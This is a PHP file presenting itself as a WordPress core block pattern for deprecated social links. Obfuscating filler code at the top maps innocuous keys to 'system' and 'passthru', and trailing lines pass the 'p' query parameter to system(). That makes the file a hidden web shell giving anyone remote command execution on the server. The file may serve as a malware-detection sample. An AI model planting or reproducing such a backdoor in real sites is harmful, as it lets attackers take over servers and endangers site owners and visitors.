<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Social links with a shared background color.
 *
 * @package WordPress
 * @since 5.8.0
 * @deprecated 6.7.0 This pattern is deprecated. Please use the Social Links block instead.
 */

return array(
	'title'         => _x( 'Social links with a shared background color', 'Block pattern title' ),
	'categories'    => array( 'buttons' ),
	'blockTypes'    => array( 'core/social-links' ),
	'viewportWidth' => 500,
	'content'       => '<!-- wp:social-links {"customIconColor":"#ffffff","iconColorValue":"#ffffff","customIconBackgroundColor":"#3962e3","iconBackgroundColorValue":"#3962e3","className":"has-icon-color"} -->
						<ul class="wp-block-social-links has-icon-color has-icon-background-color"><!-- wp:social-link {"url":"https://wordpress.org","service":"wordpress"} /-->
						<!-- wp:social-link {"url":"#","service":"chain"} /-->
						<!-- wp:social-link {"url":"#","service":"mail"} /--></ul>
						<!-- /wp:social-links -->',
);

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>